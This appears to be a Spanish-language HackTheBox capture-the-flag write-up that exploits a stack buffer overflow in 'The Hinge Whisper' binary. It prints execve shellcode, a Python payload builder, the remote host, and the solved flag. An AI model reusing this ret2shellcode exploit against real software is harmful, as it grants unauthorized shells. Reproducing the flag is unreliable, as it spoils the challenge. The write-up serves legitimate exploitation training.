# The Hinge Whisper: HackTheBox (Pwn)

**Flag:** `HTB{th3_h1ng3_wh1sp3r5_t0_th0s3_wh0_l1st3n_a20aba27e7cd298378f947cf97d539da}`

Remote: `154.57.164.65:32104`

---

## 1. Reconocimiento

```
$ file the_hinge_whisper
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

Mitigaciones:

| Protección | Estado |
|------------|--------|
| PIE        | Sí: **pero el binario nos regala la dirección del búfer** |
| NX         | **No**: `GNU_STACK … RWE`: la pila es **ejecutable** |
| Canary     | No |

Combinación clásica de `ret2shellcode`: pila ejecutable + leak de dirección de
pila. PIE deja de importar porque saltamos a una dirección que el propio
programa nos filtra.

## 2. La función vulnerable

`service_hatch` (`0x11e3`):

```c
char buf[64];                                 // rbp-0x40
printf("  [+] The keyway sits at: %p\n", buf); // <-- FILTRA la dirección del búfer
printf("  [+] Forge your latch-key: ");
read(0, buf, 0x50);                            // 80 bytes en búfer de 64
```

Dos regalos en la misma función:

1. El `%p` imprime `buf` (= `rbp-0x40`), la dirección exacta donde caerá nuestra
   entrada.
2. `read(0, buf, 0x50)` lee **80 bytes** en un búfer de **64** → desbordamiento
   de 16 bytes: 8 para el `rbp` guardado + 8 para el RIP guardado.

**Offset al RIP:** `0x40` (búfer) + `8` (rbp guardado) = **72**.
`read` da 80 bytes = 72 de relleno + 8 para el RIP.

## 3. Explotación (ret2shellcode)

Como la pila es `RWE`, se coloca shellcode `execve("/bin/sh")` al principio del
búfer y se sobrescribe el RIP con la dirección filtrada (inicio del búfer). El
`ret` salta directo al shellcode.

Layout de los 80 bytes:

```
[ shellcode execve (31 bytes) ][ NOP padding hasta 72 ][ p64(leak) ]
```

Shellcode (31 bytes, sin nulos que corten `read`):

```asm
xor rdi,rdi ; xor rsi,rsi ; xor rdx,rdx ; xor rax,rax
push rax
mov rbx, 0x68732f2f6e69622f   ; "/bin//sh"
push rbx
mov rdi, rsp
mov al, 0x3b                  ; execve
syscall
```

Flujo del exploit:

```python
intro = recv_until("latch-key:")          # banner + leak + prompt llegan juntos
buf = int(re.search(r"sits at:\s*(0x[0-9a-f]+)", intro).group(1), 16)
payload = SHELLCODE + b"\x90"*(72-len(SHELLCODE)) + p64(buf)   # 80 bytes
send(payload)                              # read() -> leave/ret -> salta al shellcode
```

## 4. Resultado

```
[+] leaked buffer @ 0x7ffe0e5db530
===SHELL===
uid=999(ctf) gid=999(ctf) groups=999(ctf)
HTB{th3_h1ng3_wh1sp3r5_t0_th0s3_wh0_l1st3n_a20aba27e7cd298378f947cf97d539da}
```

## Ficheros

- `the_hinge_whisper`: binario del reto
- `solve.py`: exploit remoto (socket puro). `-i` para shell interactiva.
